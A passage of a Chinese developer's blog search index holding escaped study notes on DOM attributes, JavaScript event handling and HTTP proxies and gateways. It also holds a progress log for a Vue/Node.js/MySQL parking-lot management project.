&lt;p&gt; nodeType 的值为 1；&lt;/p&gt;
&lt;p&gt; nodeName 的值为元素的标签名；&lt;/p&gt;
&lt;p&gt; nodeValue 的值为 null；&lt;/p&gt;
&lt;p&gt; parentNode 可能是 Document 或 Element；&lt;/p&gt;
&lt;p&gt; 其子节点可能是 Element、Text、Comment、ProcessingInstruction、CDATASection 或 EntityReference。&lt;/p&gt;
&lt;p&gt;访问元素的标签名&lt;strong&gt;nodeName&lt;/strong&gt; 和&lt;strong&gt;tagName&lt;/strong&gt; 这两个属性会返回 相同的值&lt;/p&gt;
&lt;p&gt;在 HTML 中，标签名始终都以全部大写表示&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;if (element.tagName.toLowerCase() == &amp;quot;div&amp;quot;) //这样最好（适用于任何文档） //在此执行某些操作 
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;取得特性&#34;&gt;取得特性&lt;/h2&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;getAttribute()&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;div.getAttribute(&amp;quot;id&amp;quot;) //取得这个元素的特征值&lt;/p&gt;
&lt;p&gt;特性的名称是不区分大小写的&lt;/p&gt;
&lt;p&gt;自定义特性应该加上 data-前缀以便验证(用轮播图的时候自定义特性)&lt;/p&gt;
&lt;h2 id=&#34;设置特性&#34;&gt;设置特性&lt;/h2&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;setAttribute()&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;这个方法接受两个参数：要设置的特性名和 值。如果特性已经存在，setAttribute()会以指定的值替换现有的值&lt;/p&gt;
&lt;p&gt;通过这个方法设置的 特性名会被统一转换为小写形式，即&amp;quot;ID&amp;quot;最终会变成&amp;quot;id&amp;quot;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;div.mycolor = &amp;quot;red&amp;quot;; 

 alert(div.getAttribute(&amp;quot;mycolor&amp;quot;)); //null（IE 除外） 因此想通过 getAttribute()取得同名特性的值，结果会返回 null
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;***removeAttribute()***用于彻底删除元素的特性&lt;/p&gt;
&lt;p&gt;div.removeAttribute(&amp;quot;class&amp;quot;);&lt;/p&gt;
&lt;h2 id=&#34;attributes-属性&#34;&gt;attributes 属性&lt;/h2&gt;
">DOM</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/vuenodejsmysql-kai-fa-ting-che-chang-guan-li-xi-tong/"" data-c="
          &lt;p&gt;前端github  &lt;strong&gt;https://github.com/fanfankill/depotsystem&lt;/strong&gt;&lt;br&gt;
服务端node整合   &lt;strong&gt;https://github.com/fanfankill/DeportCar.git&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;522-529&#34;&gt;&lt;strong&gt;5.22-5.29&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;对于车位管理页面完成了以下功能&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;对所有车位信息的获取，总条数的获取以及分页操作&lt;br&gt;
&lt;img src=&#34;https://fanfankill.github.io/post-images/1622270278948.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;新增车位信息（暂时以车位编号为主键 且按自动递增处理，所有其他信息都是在,未要求自己填入）&lt;br&gt;
&lt;img src=&#34;https://fanfankill.github.io/post-images/1622270324356.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;删除车位信息&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;搜索车位信息&lt;br&gt;
&lt;img src=&#34;https://fanfankill.github.io/post-images/1622270252631.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;修改车位信息（两个1 0 的修改和对车位所属区域的修改，车位价格和车位区域绑定一起，修改区域自动修改价格）&lt;br&gt;
&lt;img src=&#34;https://fanfankill.github.io/post-images/1622270469346.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;添加车位区域（车位名称（主键）车位区域价格 对车位区域的描述）&lt;br&gt;
&lt;img src=&#34;https://fanfankill.github.io/post-images/1622270291881.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;530&#34;&gt;&lt;strong&gt;5.30&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;进出车辆登记&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;暂时登记车牌号码 选择停车区域 node获取当前进入时间&lt;br&gt;
&lt;img src=&#34;https://fanfankill.github.io/post-images/1622391426393.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;img src=&#34;https://fanfankill.github.io/post-images/1622391499326.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/li&gt;
&lt;li&gt;当获取停车区域时候，使用watch属性，确保每次切换不同区域能够获取相应区域空闲车位&lt;br&gt;
&lt;img src=&#34;https://fanfankill.github.io/post-images/1622391514068.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;img src=&#34;https://fanfankill.github.io/post-images/1622391521639.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/li&gt;
&lt;li&gt;保证每个车辆只能进入时候被登记一次&lt;br&gt;
&lt;img src=&#34;https://fanfankill.github.io/post-images/1622391560153.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/li&gt;
&lt;li&gt;进出管理表与车位管理表相连接，每次登记一个，车位管理也会更新车位状态和车牌信息&lt;br&gt;
&lt;img src=&#34;https://fanfankill.github.io/post-images/1622391622553.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/li&gt;
&lt;li&gt;每次完成添加后立马更新车位空闲状态，防止多次更新同一个车位&lt;br&gt;
&lt;br&gt;&lt;br&gt;
&lt;br&gt;&lt;br&gt;
&lt;br&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;531-66&#34;&gt;&lt;strong&gt;5.31-6.6&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;车辆入库出库记录&lt;br&gt;
(与车位管理相关 每次记录一个后会修改选中的车位状态)&lt;br&gt;
1.按已出库和未出库来获取数据 点击直接获取（wacth属性）&lt;br&gt;
&lt;img src=&#34;https://fanfankill.github.io/post-images/1622973621842.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;img src=&#34;https://fanfankill.github.io/post-images/1622973626404.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
2.对于不同情况下的按钮和驶出时间进行区别设计，当为已驶出状态的按钮点击为已经记录过的详细信息&lt;br&gt;
&lt;img src=&#34;https://fanfankill.github.io/post-images/1622973728852.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
当为未出库状态下点击为预计算的信息()，若再次点击驶出按钮后则会修改该车位状态和进出状态并记录数据库&lt;br&gt;
&lt;img src=&#34;https://fanfankill.github.io/post-images/1622973813093.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;630更新&#34;&gt;6.30更新&lt;/h2&gt;
&lt;p&gt;1.新增Echarts图表统计 和 日期天气显示&lt;br&gt;
2.加强表与表的联系&lt;br&gt;
3.新增固定车主功能，主要针对小区业主&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1624985566544.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1624985575278.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1624985582564.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;img src=&#34;https://fanfankill.github.io/post-images/1624985591593.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;img src=&#34;https://fanfankill.github.io/post-images/1624985599641.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;br&gt;
&lt;br&gt;
&lt;h2 id=&#34;实训更新&#34;&gt;实训更新&lt;/h2&gt;
&lt;p&gt;1.对页面的美化&lt;br&gt;
2.对车主续费管理&lt;br&gt;
3.聊天室搭建&lt;br&gt;
4.使用vuex实现头像实时更新&lt;br&gt;
5.将页面的弹出框等代码进行组件抽离管理&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;新增骨架框等一系列美化页面操作&#34;&gt;新增骨架框等一系列美化页面操作&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1626858133359.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;img src=&#34;https://fanfankill.github.io/post-images/1626857156637.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;br&gt;
&lt;br&gt;
&lt;h3 id=&#34;个人资料更新&#34;&gt;个人资料更新&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1626857162502.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;img src=&#34;https://fanfankill.github.io/post-images/1626857165919.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;聊天室&#34;&gt;聊天室&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1626857172416.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;img src=&#34;https://fanfankill.github.io/post-images/1626857159756.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;续费操作&#34;&gt;续费操作&lt;/h3&gt;
&lt;p&gt;续费的金额也会同步到当日收入中 （echart表中）&lt;br&gt;
&lt;img src=&#34;https://fanfankill.github.io/post-images/1626857365522.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;img src=&#34;https://fanfankill.github.io/post-images/1626857362095.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;img src=&#34;https://fanfankill.github.io/post-images/1626857722866.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
">vue+node.js+mysql开发停车场管理系统</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/js-shi-jian/"" data-c="
          &lt;h1 id=&#34;事件&#34;&gt;事件&lt;/h1&gt;
&lt;p&gt;通过&lt;strong&gt;侦听器&lt;/strong&gt;来预定事件&lt;/p&gt;
&lt;h2 id=&#34;事件流&#34;&gt;事件流&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;事件流&lt;/strong&gt;描述的是从页面中接收事件的顺序&lt;br&gt;
事件例图：&lt;br&gt;
&lt;img src=&#34;https://fanfankill.github.io/post-images/1619594865905.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;IE 的事件流是事件冒泡流&lt;br&gt;
&lt;img src=&#34;https://fanfankill.github.io/post-images/1619594715319.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;Netscape Communicator 的事件流是事件捕获流&lt;br&gt;
&lt;img src=&#34;https://fanfankill.github.io/post-images/1619594736001.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;br&gt;&lt;/p&gt;
&lt;h2 id=&#34;事件冒泡&#34;&gt;事件冒泡&lt;/h2&gt;
&lt;p&gt;IE 的事件流叫做&lt;strong&gt;事件冒泡&lt;/strong&gt;，即事件开始时由最具体的元素（文档中嵌套层次最深 的那个节点）接收，然后逐级向上传播到较为不具体的节点（文档）。&lt;br&gt;
&lt;br&gt;&lt;/p&gt;
&lt;h2 id=&#34;事件捕捉&#34;&gt;事件捕捉&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;事件捕获&lt;/strong&gt;的思想 是不太具体的节点应该更早接收到事件，而最具体的节点应该最后接收到事件。&lt;br&gt;
&lt;br&gt;&lt;/p&gt;
&lt;h2 id=&#34;dom事件流&#34;&gt;DOM事件流&lt;/h2&gt;
&lt;p&gt;DOM2级事件”规定的事件流包括三个阶段：事件捕获阶段、处于目标阶段和事件冒泡阶段。&lt;br&gt;
&lt;img src=&#34;https://fanfankill.github.io/post-images/1619594960277.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
在 DOM 事件流中，实际的目标（元素）在捕获阶段不会接收到事件。这意味着在捕获阶段， 事件从 document 到再到后就停止了。下一个阶段是“处于目标”阶段，于是事件在上发生，并在事件处理（后面将会讨论这个概念）中被看成冒泡阶段的一部分。然后，冒泡阶段发生， 事件又传播回文档。&lt;/p&gt;
&lt;br&gt;
## 事件处理程序
&lt;p&gt;事件就是用户或浏览器自身执行的某种动作。诸如 click、load 和 mouseover，都是事件的名字。 而响应某个事件的函数就叫做事件处理程序（或事件侦听器）&lt;/p&gt;
&lt;p&gt;事件处理程序的名字以&amp;quot;on&amp;quot;开头（onclick，onload）&lt;br&gt;
&lt;br&gt;&lt;/p&gt;
&lt;h2 id=&#34;html事件处理程序&#34;&gt;HTML事件处理程序&lt;/h2&gt;
&lt;p&gt;这个操作是通过指定 onclick 特性并将一些 JavaScript 代码作为它的值来定义的&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;input type=&amp;quot;button&amp;quot; value=&amp;quot;Click Me&amp;quot; onclick=&amp;quot;alert(&#39;Clicked&#39;)&amp;quot; /&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;为了避免使用 HTML 实体，这里使用了单 引号。如果想要使用双引号，那么就要将代码改写成如下所示：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;input type=&amp;quot;button&amp;quot; value=&amp;quot;Click Me&amp;quot; onclick=&amp;quot;alert(&amp;amp;quot;Clicked&amp;amp;quot;)&amp;quot; /&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;事件处理程序中的代码在执行时，有权访问全局作用 域中的任何代码&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;!-- 输出 &amp;quot;click&amp;quot; --&amp;gt; 
&amp;lt;input type=&amp;quot;button&amp;quot; value=&amp;quot;Click Me&amp;quot; onclick=&amp;quot;alert(event.type)&amp;quot;&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这样指定事件处理程序具有一些独到之处。首先，这样会创建一个封装着元素属性值的函数。这个 函数中有一个局部变量 event&lt;/p&gt;
&lt;br&gt;
&lt;p&gt;通过 event 变量，可以直接访问事件对象，你不用自己定义它，也不用从函数的参数列表中读取。 在这个函数内部，this 值等于事件的目标元素&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;!-- 输出 &amp;quot;Click Me&amp;quot; --&amp;gt; 
&amp;lt;input type=&amp;quot;button&amp;quot; value=&amp;quot;Click Me&amp;quot; onclick=&amp;quot;alert(this.value)&amp;quot;&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
 ##  HTML 中指定事件处理程序的缺点
&lt;p&gt;1.存在一个时差问题。因为用户可能会在 HTML 元素一出现在页面上就触发相应的事件，但当时的事件处理程序有可能尚不具备执行条件。以前面的例子来说明，假设 showMessage()函数是在按钮下方、页面的最底部定义的。如果用户在页面解 析 showMessage()函数之前就单击了按钮就会引发错误。为此，很多 HTML 事件处理程序都会被封 装在一个 try-catch 块中，以便错误不会浮出水面，如下面的例子所示：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;input type=&amp;quot;button&amp;quot; value=&amp;quot;Click Me&amp;quot; onclick=&amp;quot;try{showMessage();}catch(ex){}&amp;quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;2.这样扩展事件处理程序的作用域链在不同浏览器中会导致不同结果。不同 JavaScript 引擎遵循的标识符解析规则略有差异，很可能会在访问非限定对象成员时出错。&lt;/p&gt;
&lt;p&gt;3.是 HTML 与 JavaScript 代码紧密耦合。如果要更换事 件处理程序，就要改动两个地方：HTML 代码和 JavaScript 代码&lt;br&gt;
&lt;br&gt;&lt;/p&gt;
&lt;h2 id=&#34;dom0-级事件处理程序&#34;&gt;DOM0 级事件处理程序&lt;/h2&gt;
&lt;p&gt;通过 JavaScript 指定事件处理程序的传统方式&lt;/p&gt;
&lt;p&gt;原因一是简单，二是具有跨浏览器的优势&lt;/p&gt;
&lt;p&gt;要使用 JavaScript 指定事件处理程序，首先必须取得一 个要操作的对象的引用&lt;/p&gt;
&lt;br&gt;
&lt;p&gt;使用 DOM0 级方法指定的事件处理程序被认为是元素的方法。因此，这时候的事件处理程序是在 元素的作用域中运行；换句话说，程序中的 this 引用当前元素&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var btn = document.getElementById(&amp;quot;myBtn&amp;quot;); 
btn.onclick = function(){ 
alert(this.id); //&amp;quot;myBtn&amp;quot; 
};

btn.onclick = null; //删除事件处理程序
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;以这种方式添加的事件处理程序会在事件流的冒泡阶段被处理&lt;/p&gt;
&lt;p&gt;将事件处理程序设置为 null 之后，再单击按钮将不会有任何动作发生。&lt;/p&gt;
&lt;br&gt;
&lt;br&gt;
## DOM2 级事件处理程序
&lt;p&gt;“DOM2级事件”定义了两个方法，用于处理指定和删除事件处理程序的操作：**addEventListener() **和 &lt;strong&gt;removeEventListener()&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;它们都接受 3 个参数：要处 理的事件名、作为事件处理程序的函数和一个布尔值。最后这个布尔值参数如果是 true，表示在捕获 阶段调用事件处理程序；如果是 false，表示在冒泡阶段调用事件处理程序&lt;/p&gt;
&lt;p&gt;在按钮上为 click 事件添加事件处理程序&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var btn = document.getElementById(&amp;quot;myBtn&amp;quot;); 
btn.addEventListener(&amp;quot;click&amp;quot;, function(){ 
 alert(this.id); 
}, false); 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;上面的代码为一个按钮添加了 onclick 事件处理程序，而且该事件会在冒泡阶段被触发&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var btn = document.getElementById(&amp;quot;myBtn&amp;quot;); 
btn.addEventListener(&amp;quot;click&amp;quot;, function(){ 
 alert(this.id); 
}, false); 
btn.addEventListener(&amp;quot;click&amp;quot;, function(){ 
 alert(&amp;quot;Hello world!&amp;quot;); 
}, false); 

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;这里为按钮添加了两个事件处理程序。这两个事件处理程序会按照添加它们的顺序触发，因此首先 会显示元素的 ID，其次会显示&amp;quot;Hello world!&amp;quot;消息&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;通过 addEventListener()添加的事件处理程序只能使用 removeEventListener()来移除，这也意味着通过 addEventListener()添加的匿 名函数将无法移除。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var btn = document.getElementById(&amp;quot;myBtn&amp;quot;); 
btn.addEventListener(&amp;quot;click&amp;quot;, function(){ 
 alert(this.id)}, false); 
//这里省略了其他代码
btn.removeEventListener(&amp;quot;click&amp;quot;, function(){ //没有用！
 alert(this.id); 
}, false); 

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;传入 removeEventListener()中的事件处理程序函数必须与传入 addEventListener()中的&lt;strong&gt;相同&lt;/strong&gt; ，因为一一对应，addEvenListener()可以给click或其他添加很多函数，所以removeEvenListener()也要一一去和它对应&lt;/p&gt;
&lt;p&gt;大多数情况下，都是将事件处理程序添加到事件流的冒泡阶段（f第三个参数为false），这样可以最大限度地兼容各种浏览器。&lt;br&gt;
&lt;br&gt;&lt;/p&gt;
&lt;h2 id=&#34;事件对象&#34;&gt;事件对象&lt;/h2&gt;
&lt;p&gt;在触发 DOM 上的某个事件时，会产生一个事件对象 event，这个对象中包含着所有与事件有关的 信息。&lt;/p&gt;
&lt;h2 id=&#34;dom中的事件对象&#34;&gt;DOM中的事件对象&lt;/h2&gt;
&lt;p&gt;兼容 DOM 的浏览器会将一个 event 对象传入到事件处理程序中&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var btn = document.getElementById(&amp;quot;myBtn&amp;quot;); 
btn.onclick = function(event){ 
 alert(event.type); //&amp;quot;click&amp;quot; 
}; 
btn.addEventListener(&amp;quot;click&amp;quot;, function(event){ 
 alert(event.type); //&amp;quot;click&amp;quot; 
}, false);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;要阻止特定事件的默认行为，可以使用 preventDefault()方法&lt;/p&gt;
&lt;p&gt;链接的默认行为就是在 被单击时会导航到其 href 特性指定的 URL。如果你想阻止链接导航这一默认行为，那么通过链接的 onclick 事件处理程序可以取消它&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var link = document.getElementById(&amp;quot;myLink&amp;quot;); 
link.onclick = function(event){ 
 event.preventDefault(); 
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;stopPropagation()方法用于立即停止事件在 DOM 层次中的传播&lt;/p&gt;
&lt;p&gt;从而避免触 发注册在 document.body 上面的事件处理程序&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var btn = document.getElementById(&amp;quot;myBtn&amp;quot;); 
btn.onclick = function(event){ 
 alert(&amp;quot;Clicked&amp;quot;); 
 event.stopPropagation(); 
}; 
document.body.onclick = function(event){ 
 alert(&amp;quot;Body clicked&amp;quot;); 
}; 
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;事件类型&#34;&gt;事件类型&lt;/h2&gt;
&lt;br&gt;
&lt;h3 id=&#34;load事件&#34;&gt;&lt;strong&gt;load事件&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;当页面完全加载后（包括所有图像、JavaScript 文件、 CSS 文件等外部资源），就会触发 window 上面的 load 事件。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;&amp;lt;body onload=&amp;quot;alert(&#39;Loaded!&#39;)&amp;quot;&amp;gt; 
&amp;lt;/body&amp;gt;

//对图像的load事件
&amp;lt;img src=&amp;quot;smile.gif&amp;quot; onload=&amp;quot;alert(&#39;Image loaded.&#39;)&amp;quot;&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h3 id=&#34;unload-事件&#34;&gt;&lt;strong&gt;unload 事件&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;利用这个事件最多的情况是清除引用，以避免内存泄漏&lt;br&gt;
&lt;br&gt;&lt;/p&gt;
&lt;h3 id=&#34;resize-事件&#34;&gt;&lt;strong&gt;resize 事件&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;当浏览器窗口被调整到一个新的高度或宽度时，就会触发 resize 事件&lt;/p&gt;
&lt;p&gt;IE、Safari、Chrome 和 Opera 会在浏览 器窗口变化了 1 像素时就触发 resize 事件，然后随着变化不断重复触发。Firefox 则只会在用户停止调 整窗口大小时才会触发 resize 事件&lt;/p&gt;
&lt;p&gt;浏览器窗口最小化或最大化时也会触发 resize 事件&lt;br&gt;
&lt;br&gt;&lt;/p&gt;
&lt;h3 id=&#34;scroll-事件&#34;&gt;&lt;strong&gt;scroll 事件&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;scroll 事件也会在文档被滚动期间重复被触发，所以有必要尽量保持事件 处理程序的代码简单&lt;br&gt;
&lt;br&gt;&lt;/p&gt;
&lt;h3 id=&#34;焦点事件&#34;&gt;&lt;strong&gt;焦点事件&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;焦点事件会在页面元素获得或失去焦点时触发。利用这些事件并与 document.hasFocus()方法及 document.activeElement 属性配合，可以知晓用户在页面上的行踪&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;blur&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在元素失去焦点时触发。这个事件不会冒泡；所有浏览器都支持它&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;DOMFocusIn&lt;/p&gt;
&lt;p&gt;在元素获得焦点时触发。这个事件与 HTML 事件 focus 等价，但它冒泡&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;DOMFoucusOut&lt;/p&gt;
&lt;p&gt;在元素失去焦点时触发，兼容性不强&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;focus&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在元素获得焦点时触发。这个事件不会冒泡；所有浏览器都支持它。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;focusin&lt;/p&gt;
&lt;p&gt;这个事件与 HTML 事件 focus 等价，但它冒泡&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;focusout&lt;/p&gt;
&lt;p&gt;这个事件是 HTML 事件 blur 的通用版本&lt;br&gt;
&lt;br&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;鼠标与滚轮事件&#34;&gt;&lt;strong&gt;鼠标与滚轮事件&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;click&lt;/p&gt;
&lt;p&gt;在用户单击主鼠标按钮（一般是左边的按钮）或者按下回车键时触发。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;dblclick&lt;/p&gt;
&lt;p&gt;在用户双击主鼠标按钮（一般是左边的按钮）时触发。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;mousedown&lt;/p&gt;
&lt;p&gt;在用户按下了任意鼠标按钮时触发。不能通过键盘触发这个事件。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;mouseenter&lt;/p&gt;
&lt;p&gt;在鼠标光标从元素外部首次移动到元素范围之内时触发。这个事件不冒泡，而且 在光标移动到后代元素上不会触发。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;mouseleave&lt;/p&gt;
&lt;p&gt;在位于元素上方的鼠标光标移动到元素范围之外时触发。这个事件不冒泡，而且 在光标移动到后代元素上不会触发。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;mousemove&lt;/p&gt;
&lt;p&gt;当鼠标指针在元素内部移动时重复地触发。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;mouseout&lt;/p&gt;
&lt;p&gt;在鼠标指针位于一个元素上方，然后用户将其移入另一个元素时触发。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;mouseover&lt;br&gt;
在鼠标指针位于一个元素外部，然后用户将其首次移入另一个元素边界之内时触 发。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;mouseup&lt;/p&gt;
&lt;p&gt;在用户释放鼠标按钮时触发。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
">JS事件</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/tu-jie-http-di-liu-zhang/"" data-c="
          &lt;h1 id=&#34;与http协助的web服务器&#34;&gt;与HTTP协助的Web服务器&lt;/h1&gt;
&lt;h2 id=&#34;用单台虚拟主机实现多个域名&#34;&gt;用单台虚拟主机实现多个域名&lt;/h2&gt;
&lt;p&gt;允许一台HTTP服务器搭建多个Web站点。&lt;/p&gt;
&lt;p&gt;即使物理层面只有一台服务器，但只要使用虚拟主机的功能，则可以假想已具有多台服务器&lt;/p&gt;
&lt;p&gt;在互联网上，域名通过 DNS 服务映射到 IP 地址（域名解析）之后访问目标网站，所以，当请求发送到服务器时，已经是IP地址形式访问了&lt;/p&gt;
&lt;h2 id=&#34;通信数据转发程序代理-网关-隧道&#34;&gt;通信数据转发程序：代理、网关、隧道&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;代理&lt;/p&gt;
&lt;p&gt;扮演中间人，接收由客户端发送的请求并转发给服务器，同是，也接收服务器返回的响应并转发给客户端&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;网关&lt;/p&gt;
&lt;p&gt;网关是转发其他服务器通信数据的服务器，接收从客户端发送来的请求时，它就像自己拥有资源的服务器&lt;/p&gt;
&lt;/li&gt;
